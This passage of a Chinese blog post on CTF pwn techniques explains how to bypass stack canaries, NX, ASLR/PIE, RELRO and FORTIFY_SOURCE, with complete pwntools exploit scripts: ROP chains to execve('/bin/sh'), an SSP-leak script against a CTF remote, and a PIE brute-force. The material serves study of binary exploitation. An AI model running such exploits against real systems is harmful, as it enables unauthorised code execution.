+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201134725299.png" alt="image-20220201134725299"></p>
+<h5 id="思路：-2"><a href="#思路：-2" class="headerlink" title="思路："></a>思路：</h5><p>用docker起个libc-2.31的环境，gdb调试查看cannary的值，然后 <strong>用fsbase查找TLS结构体的位置（即FS指针位置）</strong> ，可以取得cannary的保存位置即 <strong>FS:[28]</strong> ——**$rbp+2104**，又因为栈溢出字节数很多，可以覆盖到这个位置，然后就可以构造ROP同时覆盖栈上存储的canary和TLS储存的canary实现绕过进行libc的泄露，最后再次回到输入处，再次构造ROP调用execve来getshell，本题system可能由于高版本的问题打不通。 </p>
+<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line"><span class="comment">#p = gdb.debug(&quot;./a.out&quot;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span>(<span class="params">content</span>):</span></span><br><span class="line"> p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">r_a64</span>(<span class="params">signal</span>):</span></span><br><span class="line"> <span class="keyword">return</span> u64(p.recvuntil(signal)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"> </span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x401363</span></span><br><span class="line">main = <span class="number">0x4011D6</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="number">0x30</span> * <span class="string">&#x27;a&#x27;</span> +  + <span class="number">0x8</span> * <span class="string">&#x27;b&#x27;</span> </span><br><span class="line">payload2 = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">payload = payload1 + payload2.ljust(<span class="number">2104</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">puts = r_a64(<span class="string">&#x27;\x7f&#x27;</span>)</span><br><span class="line">success(<span class="string">&#x27;puts: &#x27;</span> + <span class="built_in">hex</span>(puts))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.31.so&#x27;)</span></span><br><span class="line">libc_base = puts - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">exe = libc_base + libc.symbols[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">rdx_r12 = <span class="number">0x11c371</span> + libc_base</span><br><span class="line">rsi = <span class="number">0x27529</span> + libc_base</span><br><span class="line">payload = <span class="number">0x30</span> * <span class="string">&#x27;a&#x27;</span> + <span class="number">0x8</span> * <span class="string">&#x27;b&#x27;</span> + p64(pop_rdi) + p64(binsh) + p64(rsi) + p64(<span class="number">0</span>) + p64(rdx_r12) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(exe) + p64(main)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-SSP-leak-攻击"><a href="#5-SSP-leak-攻击" class="headerlink" title="5.SSP leak 攻击"></a>5.SSP leak 攻击</h3><p>除了通过各种方法泄露canary之外，我们还有一个可选项——利用<code>__stack_chk_fail</code>函数泄露信息。这种方法作用不大，没办法让我们getshell。但是当我们需要泄露的flag或者其他东西存在于内存中时，我们可能可以使用一个栈溢出漏洞来把它们泄露出来。这个方法叫做 <strong>SSP(Stack Smashing Protect) Leak</strong>。</p>
+<p>简单的来说，SSP leak 就是通过故意触发canary的保护来输出我们想要地址上的值。</p>
+<p>我们先来回顾一下canary起作用到程序退出的流程。首先，canary被检测到修改，函数不会经过正常的流程结束栈帧并继续执行接下来的代码，而是跳转到<code>call __stack_chk_fail</code>处，然后对于我们来说，执行完这个函数，程序退出，屏幕上留下一行<br><strong>*** stack smashing detected ***: [XXX] terminated</strong> 。如：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201102707231.png" alt="image-20220201102707231"></p>
+<p>这里的 <strong>[XXX]</strong> 是程序的名字。显然，这行字不可能凭空产生，肯定是<code>__stack_chk_fail</code>打印出来的。而且，程序的名字一定是个来自外部的变量（毕竟ELF格式里面可没有保存程序名）。既然是个来自外部的变量，就有修改的余地。我们看一下<code>__stack_chk_fail</code>的源码，会发现其实现如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>) </span><br><span class="line">&#123;  </span><br><span class="line">    __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg) </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="comment">/* The loop is added only to keep gcc happy. */</span> </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)   </span><br><span class="line">        __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,             </span><br><span class="line">                        msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们看到<code>__libc_message</code>一行输出了  <strong>*** %s ***: %s terminated\n</strong>  。这里的参数分别是msg和<code>__libc_argv[0]</code>。<code>char *argv[]</code>是main函数的参数，<code>argv[0]</code>存储的就是程序名，且这个argv[0]就存在于栈上。</p>
+<p>因此 <strong>SSP leak就是通过修改栈上的 argv[0]指针</strong> ，从而让 <code>__stack_chk_fail</code> 被触发后输出我们想要知道的东西。</p>
+<h4 id="例题：-4"><a href="#例题：-4" class="headerlink" title="例题："></a>例题：</h4><p><strong>来自 Jarvis OJ—Smashes</strong></p>
+<p>64位程序不仅开了NX、canary,还开了FORTIFY</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201141323970.png" alt="image-20220201141323970"></p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201141211457.png" alt="image-20220201141211457"></p>
+<p><strong>IO_gets()</strong> 函数处明显存在栈溢出：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201141141698.png" alt="image-20220201141141698"></p>
+<h5 id="思路：-3"><a href="#思路：-3" class="headerlink" title="思路："></a>思路：</h5><p>利用栈溢出覆盖 <strong>argv[0]指针</strong>，让其指向内存中flag字符串的位置，然后故意触发canary保护机制，达到在打印报错信息的同时打印出flag字符串的目的。</p>
+<p>在main函数下个断点，查看 <strong>argv[0]指针的地址</strong> —— <strong>0x7fffffffe498</strong></p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201184756552.png" alt="image-20220201184756552"></p>
+<p>在 <strong>0x400813</strong> 下个断点，查看输入的 <strong>name在栈上的地址</strong></p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201185009388.png" alt="image-20220201185009388"></p>
+<p>得到 <strong>name地址</strong> ：<strong>0x7fffffffe280</strong></p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201185138980.png" alt="image-20220201185138980"></p>
+<p>计算偏移为 <strong>0x7fffffffe498 - 0x7fffffffe280 = 0x218</strong></p>
+<p>再通过搜索，找到flag字符串在内存中的位置：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220201183833145.png" alt="image-20220201183833145"></p>
+<p>尝试发现 <strong>0x400d20</strong> 才是flag的真实位置。</p>
+<h5 id="EXP：-2"><a href="#EXP：-2" class="headerlink" title="EXP："></a>EXP：</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;pwn.jarvisoj.com&quot;</span>,<span class="number">9877</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello!\nWhat&#x27;s your name? &quot;</span>)</span><br><span class="line">offset = <span class="number">0x218</span></span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span> * offset + p64(<span class="number">0x400d20</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please overwrite the flag: &quot;</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="二、No-eXecute"><a href="#二、No-eXecute" class="headerlink" title="二、No-eXecute"></a>二、No-eXecute</h3><p>No-eXecute即NX保护 (不可执行）的意思，NX（window上称为DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
+<p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。</p>
+<p>开启NX保护，GNU_STACK权限为RWE(可读、可写、可执行)：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220202100935288.png" alt="image-20220202100935288"></p>
+<p>关闭NX保护，GNU_STACK权限只有RW（不可执行）：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220202100858350.png" alt="image-20220202100858350"></p>
+<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><p><strong>1、ret2libc攻击</strong></p>
+<p><strong>2、修改分配页面的保护级别</strong></p>
+<hr>
+<h3 id="1-ret2libc攻击"><a href="#1-ret2libc攻击" class="headerlink" title="1.ret2libc攻击"></a>1.ret2libc攻击</h3><p><strong>ret2libc</strong> 全称为 <strong>return to libc</strong> ，即返回到libc库。由于栈和堆均不可执行，使我们无法直接向栈或堆注入shellcode，然后跳转到起始位置开始执行。由此 <strong>ret2libc</strong> 攻击方式应运而生。 <strong>ret2libc</strong> 是利用程序现有的代码片段构造 <strong>ROP链</strong> 使程序返回到libc库中去执行libc中的函数，比如 <strong>system(‘/bin/sh’)</strong> 。因为一般程序默认开启NX保护，所以 <strong>ret2libc</strong> 是pwn中最常用最有效的方法之一。</p>
+<p><em><u>因为该方法过于基础常见，就不做例题演示了。</u></em></p>
+<h3 id="2-修改分配页面的保护级别"><a href="#2-修改分配页面的保护级别" class="headerlink" title="2.修改分配页面的保护级别"></a>2.修改分配页面的保护级别</h3><p>开了NX保护的情况下就只有程序的 .text 段被标记为可执行，而其余的数据段（.data、.bss等）以及栈、堆均为不可执行。libc函数库中有两个函数可以修改分配页面的属性即可以让一部分不可执行的空间修改为可执行，这两个函数分别是 <strong>mprotect</strong> 和 <strong>mmap</strong> 。这里我就只介绍 <strong>mprotect</strong> 函数：</p>
+<h4 id="mprotect使用："><a href="#mprotect使用：" class="headerlink" title="mprotect使用："></a>mprotect使用：</h4><p>函数原型：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mmap.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p>
+<p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p>
+<ul>
+<li>PROT_READ  （1）：表示内存段内的内容可读；</li>
+<li>PROT_WRITE（2）：表示内存段内的内容可写；</li>
+<li>PROT_EXEC  （4）：表示内存段中的内容可执行；</li>
+<li>PROT_NONE（0）：表示内存段中的内容根本没法访问。</li>
+</ul>
+<p>需要指出的是，<u>锁指定的内存区间必须包含整个内存页</u>（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。</p>
+<p>一般情况下，我们都是使用 <strong>mprotect(bss_addr , 0x1000, 7)</strong> ,这样可以让从 <strong>bss_addr</strong>（选择bss段的原因是bss段的空闲空间很大，而且地址好找）开始的 <strong>0x1000</strong> 大小 的区域权限为 <strong>RWE</strong>(R + W + E = 1 + 2 + 4 =7)即可读可写可执行，这样之后我们可以直接注入shellcode到这一区域中，然后再让程序跳转到这里执行shellcode。</p>
+<p>当然我们还可以利用 <strong>mprotect</strong> 将.<strong>got.plt</strong> 修改为可读可写可执行，这样我们就能更改got表项地址，劫持got表函数。</p>
+<h5 id="例题：-5"><a href="#例题：-5" class="headerlink" title="例题："></a>例题：</h5><p>*看我之前发布的  <strong>CTF-pwn 技术总结（1）</strong>中的 <strong>CET4</strong>* </p>
+<h3 id="三、ASLR和PIE"><a href="#三、ASLR和PIE" class="headerlink" title="三、ASLR和PIE"></a>三、ASLR和PIE</h3><h4 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h4><p>大多数攻击都基于这样一个前提，即攻击者知道程序的内部布局。因此，引入内存布局的随机化能有效增加漏洞利用的难度，其中一种技术就是地址空间布局随机化（Address Space Layout Randomization,ASLR）。ASLR提供的只是概率上的安全性，根据用于随机化的熵，攻击者有可能幸运地猜测到正确的地址，有时攻击者还可以爆破。</p>
+<p>在linux上，<strong>ASLR</strong> 的全局配置 <strong>/proc/sys/kernel/randomize_va_space</strong> 有以下三种情况</p>
+<p>0 - 表示关闭进程地址空间随机化<br>1 - 表示将mmap的基址，stack和vdso页面随机化<br>2 - 表示在1的基础上增加栈（heap）的随机化</p>
+<table>
+<thead>
+<tr>
+<th align="center">ASLR</th>
+<th align="center">Executable</th>
+<th align="center">PLT</th>
+<th align="center">Heap</th>
+<th align="center">Stack</th>
+<th align="center">shared libraries</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">0</td>
+<td align="center">x</td>
+<td align="center">x</td>
+<td align="center">x</td>
+<td align="center">x</td>
+<td align="center">x</td>
+</tr>
+<tr>
+<td align="center">1</td>
+<td align="center">x</td>
+<td align="center">x</td>
+<td align="center">x</td>
+<td align="center">O</td>
+<td align="center">O</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">x</td>
+<td align="center">x</td>
+<td align="center">O</td>
+<td align="center">O</td>
+<td align="center">O</td>
+</tr>
+<tr>
+<td align="center">2+ <strong>PIE</strong></td>
+<td align="center">O</td>
+<td align="center">O</td>
+<td align="center">O</td>
+<td align="center">O</td>
+<td align="center">O</td>
+</tr>
+</tbody></table>
+<p>查看 ASLR</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/proc/</span>sys<span class="regexp">/kernel/</span>randomize_va_space </span><br></pre></td></tr></table></figure>
+
+<p>更改ASLR，切换至root用户，输入命令</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">echo <span class="number">0</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/kernel/</span>randomize_va_space</span><br></pre></td></tr></table></figure>
+
+<h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p><strong>PIE</strong> 全称为位置无关可执行文件（Position-Independent Executable）,它在应用层的编译器上实现，通过将程序编译为位置无关代码（Position-Independent Code, PIC）,使程序可以加载到任意位置，就像一个特殊的共享库。在 <strong>PIE和ASLR同时开启</strong> 的情况下，攻击者将对程序内部布局一无所知，大大增加了利用难度。</p>
+<p>GCC支持的 <strong>PIE</strong> 选项：</p>
+<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-fpic		为共享库生成位置无关代码</span></span><br><span class="line"><span class="deletion">-pie 		生成动态链接的位置无关的可执行文件，通常需要同时指定 -fpie</span></span><br><span class="line"><span class="deletion">-no-pie		不生成动态链接的位置无关的可执行文件</span></span><br><span class="line"><span class="deletion">-fpie		类似于-fpic，但生成的位置无关代码只能用于可执行文件，通常同时指定-pie</span></span><br><span class="line"><span class="deletion">-fno-pie	不生成位置无关代码</span></span><br></pre></td></tr></table></figure>
+
+<p>通常对于一般的可执行文件，使用 <strong>“-pie-fpie”</strong> 参数。</p>
+<h4 id="绕过方法-2"><a href="#绕过方法-2" class="headerlink" title="绕过方法"></a>绕过方法</h4><p><strong>1、泄露地址</strong></p>
+<p><strong>2、partial write</strong></p>
+<hr>
+<h3 id="1-泄露地址"><a href="#1-泄露地址" class="headerlink" title="1.泄露地址"></a>1.泄露地址</h3><p>PIE 保护机制，影响的是程序加载的基址，并不会影响指令间的相对地址，因此如果我们能够泄露程序的某个地址，就可以通过修改偏移获得程序其它函数的地址。</p>
+<h4 id="例题：-6"><a href="#例题：-6" class="headerlink" title="例题："></a>例题：</h4><p>*看我之前发布的  <strong>CTF-pwn 技术总结（1）</strong>中的 <strong>checkin_revenge</strong>* </p>
+<h3 id="2-partial-write"><a href="#2-partial-write" class="headerlink" title="2.partial write"></a>2.partial write</h3><p><strong>partial write</strong> (部分写入)就是一种利用了PIE技术缺陷的绕过技术。由于内存的页载入机制，PIE的随机化只能影响到单个内存页。通常来说，一个内存页大小为0x1000，这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的。因此通过覆盖EIP的后8或16位 (按字节写入，每字节8位)就可以快速爆破或者直接劫持EIP。</p>
+<h4 id="例题：-7"><a href="#例题：-7" class="headerlink" title="例题："></a>例题：</h4><p><strong>来自 DefCamp CTF Finals 2016—SMS</strong></p>
+<p>64位开启PIE与NX程序，</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220202162807044.png" alt="image-20220202162807044"></p>
+<p>main函数：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220202162429085.png" alt="image-20220202162429085"></p>
+<p>进入dosms函数：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220202162614924.png" alt="image-20220202162614924"></p>
+<p>set_user函数：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220202162551865.png" alt="image-20220202162551865"></p>
+<p>set_sms函数：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220202162644075.png" alt="image-20220202162644075"></p>
+<p>程序存在后门函数——frontdoor，进入看看:</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220202163243404.png" alt="image-20220202163243404"></p>
+<h5 id="思路：-4"><a href="#思路：-4" class="headerlink" title="思路："></a>思路：</h5><p>重要的地方在于，fgets向s处读入数据，然后通过strncpy函数，将读入的s的 （a1+180） 长度，复制到a1。a1+180处 要被当做数值来执行strncpy，只要a1+180处数值足够大就可以造成栈溢出。由set_user函数可以知道，a1+180处的数据刚刚好是可以改写的。所以我们只要利用栈溢出改写程序的返回地址为后门函数的地址即可。但因为本题开启了PIE，我们无法知道后门函数的准确地址，我们只知道它后3位为 <strong>0x900</strong>：</p>
+<p><img src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/image-20220202164546065.png" alt="image-20220202164546065"></p>
+<p>所以我们利用 <strong>partial write</strong> 方法来部分覆盖返回地址，但是由于payload必须按字节写入，每个字节是两个十六进制数，所以我们必须输入两个字节。除去已知的0x900还需要爆破一个十六进制数。这个数只可能在0~0xf之间改变，因此爆破空间不大，可以接受。</p>
+<h5 id="EXP：-3"><a href="#EXP：-3" class="headerlink" title="EXP："></a>EXP：</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    success(<span class="string">&quot;this is the %d times&quot;</span> % i)</span><br><span class="line">    p = process(<span class="string">&#x27;./SMS&#x27;</span>)</span><br><span class="line">    payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">40</span> + <span class="string">&#x27;\xca&#x27;</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter your name\n&#x27;</span>, payload1)</span><br><span class="line">    payload2 = <span class="string">&#x27;b&#x27;</span>*<span class="number">200</span> + <span class="string">&#x27;\x01\x09&#x27;</span>  <span class="comment"># 这里假设实际地址低16位为0x0901，爆破直到地址正确</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;SMS our leader\n&#x27;</span>, payload2)</span><br><span class="line">    p.recv()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recv(timeout = <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()   <span class="comment"># 如果触发异常，即地址第16位不为0x0901，那么关闭程序，继续下一趟的尝试</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:   <span class="comment"># 没有触发异常，说明程序成功调用frontdoor，那么输入参数获取shell</span></span><br><span class="line">        p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="四、RELRO"><a href="#四、RELRO" class="headerlink" title="四、RELRO"></a>四、RELRO</h3><p><strong>RELRO</strong>（ReLocation Read-Only）是设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击的一种程序保护机制。</p>
+<p>在Linux中有两种RELRO模式：<code>Partial RELRO</code> 和 <code>Full RELRO</code>。Linux中<code>Partical RELRO</code>默认开启。</p>
+<h4 id="Partial-RELRO："><a href="#Partial-RELRO：" class="headerlink" title="Partial RELRO："></a>Partial RELRO：</h4><p><strong>编译命令：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c <span class="comment">// 默认部分开启</span></span><br><span class="line">gcc -Wl,-z,relro -o test test.c <span class="comment">// 开启部分RELRO</span></span><br><span class="line">gcc -z lazy -o test test.c <span class="comment">//部分开启</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>该ELF文件的各个部分被重新排序。内数据段（internal data sections）（如.got，.dtors等）置于程序数据段（program’s data sections）（如.data和.bss）之前；</li>
+<li>无 plt 指向的GOT是只读的；</li>
+<li>GOT表可写（应该是与上面有所区别的）。</li>
+</ul>
+<h4 id="Full-RELRO："><a href="#Full-RELRO：" class="headerlink" title="Full RELRO："></a>Full RELRO：</h4><p><strong>编译命令：</strong></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">gcc -Wl,-z,relro,-z,now -o test test.c <span class="comment">// 开启Full RELRO</span></span><br><span class="line">gcc -z now -o test test.c <span class="comment">// 全部开启</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>支持Partial模式的所有功能；</li>
+<li>整个GOT表映射为只读的。</li>
+</ul>
+<p><strong>简单来说 用checksec查看 RELRO为” <code>Partial RELRO</code> ”，说明我们对GOT表具有写权限；如果为 ” <code>FULL RELRO</code> “ ，意味着我们无法修改got表。</strong></p>
+<h4 id="绕过方法-3"><a href="#绕过方法-3" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>一般遇到 <strong>FULL RELRO</strong> 不必硬刚，一般还是有其他漏洞点可利用，不是必须要利用GOT表的。但是也是有方法绕过的：</p>
+<p><strong>1.修改分配页面的保护级别</strong></p>
+<p>利用libc函数 <strong>mprotect</strong> 修改got表属性为 <strong>RWE</strong>。</p>
+<p>*具体实现方法同上面  <strong>NX保护</strong> 绕过方法 中的 <strong>修改分配页面的保护级别</strong>，仅将修改地址改为 got表地址即可。*</p>
+<h3 id="五、FORTIFY-SOURCE"><a href="#五、FORTIFY-SOURCE" class="headerlink" title="五、FORTIFY_SOURCE"></a>五、FORTIFY_SOURCE</h3><p> <strong>Fority</strong> 其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。 <strong>Fortify</strong> 是GCC在编译源码时判断程序的哪些buffer会存在可能的溢出，在buffer大小已知的情况下，GCC会把 <code>strcpy</code>、<code>memcpy</code>、<code>memset</code>等函数自动替换成相应的<code> __strcpy_chk</code>(<code>dst</code>, <code>src</code>, <code>dstlen</code>)等函数，达到防止缓冲区溢出的作用。****</p>
+<p> FORTIFY_SOURCE 机制 <strong>对格式化字符串有两个限制</strong>：</p>
+<p> (1)包含%n的格式化字符串不能位于程序内存中的可写地址；</p>
+<p> (2)当使用位置参数时，必须使用范围内的所有参数。例如要使用%4$x，则必须同时使用1、2、3。</p>
+<h4 id="开启-关闭方式"><a href="#开启-关闭方式" class="headerlink" title="开启/关闭方式"></a>开启/关闭方式</h4><p>GCC中<code>-D_FORTIFY_SOURCE=2</code>是默认开启的，但是只有开启O2或以上优化的时候，这个选项才会被真正激活。</p>
+<p>如果指定<code>-D_FORTIFY_SOURCE=1</code>，那同样也要开启O1或以上优化，这个选项才会被真正激活。</p>
+<p>可以使用<code>-U_FORTIFY_SOURCE</code>或者<code>-D_FORTIFY_SOURCE=0</code>来禁用。</p>
+<p>如果开启了<code>-D_FORTIFY_SOURCE=2</code>，那么调用<code>__printf_chk</code>函数的时候会检查format string中是否存在<code>%n</code>，如果存在<code>%n</code> 而且format string是在一个可写的segment中的（不是在read-only内存段中），那么程序会报错并终止。如果是开启<code>-D_FORTIFY_SOURCE=1</code>，那么就不会报错</p>
+<p><code>gcc -D_FORTIFY_SOURCE=1</code> 仅仅只会在编译时进行检查 (特别像某些头文件 <code>#include &lt;string.h&gt;</code>)</p>
+<p><code>gcc -D_FORTIFY_SOURCE=2</code> 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序)</p>
+<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">gcc -o <span class="keyword">test</span> <span class="keyword">test</span>.c							<span class="comment">// 默认情况下，不会开这个检查</span></span><br><span class="line">gcc -D_FORTIFY_SOURCE=1 -o <span class="keyword">test</span> <span class="keyword">test</span>.c		<span class="comment">// 较弱的检查</span></span><br><span class="line">gcc -D_FORTIFY_SOURCE=2 -o <span class="keyword">test</span> <span class="keyword">test</span>.c		<span class="comment">// 较强的检查</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="绕过方法-4"><a href="#绕过方法-4" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>FORTIFY保护一般在CTF比赛中很少遇见，就算是开启了该保护，一般也有其他漏洞点可以利用，一般不会在它上面做文章，但是FORTIFY_SOURCE中的格式字符串保护机制存在有绕过方法，感兴趣的小伙伴可以从一篇国外的经典文章：<a target="_blank" rel="noopener" href="http://phrack.org/issues/67/9.html">http://phrack.org/issues/67/9.html</a> 上学习一下 ，这里就不再说明。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">pyh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/02/01/CTF-pwn-%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%883%EF%BC%89/">http://example.com/2022/02/01/CTF-pwn-%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%883%EF%BC%89/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">爱玩且很菜</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/linux/">linux</a></div><div class="post_share"><div class="social-share" data-image="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/wallhaven-o3wzql.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/02/05/CTF-pwn-%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%884%EF%BC%89/"><img class="prev-cover" src="https://gitee.com/awqhc-sf233/awqhc-blog/raw/master/img/wallhaven-6o7md7.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div 